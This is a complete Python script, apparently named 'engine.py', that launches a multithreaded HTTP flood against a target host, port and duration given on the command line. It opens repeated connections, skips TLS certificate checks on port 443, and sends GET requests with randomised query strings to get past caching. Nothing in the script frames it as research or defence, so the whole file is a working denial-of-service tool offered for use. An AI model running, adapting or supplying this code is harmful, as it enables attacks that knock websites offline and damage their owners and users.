import socket
import ssl
import threading
import time
import random
import sys

def attack(target, port, duration, threads):
    target_ip = socket.gethostbyname(target)
    timeout = time.time() + duration
    
    def flood():
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                
                s.send(f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                s.close()
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python engine.py <target> <port> <duration> <threads>")
    else:
        attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]))
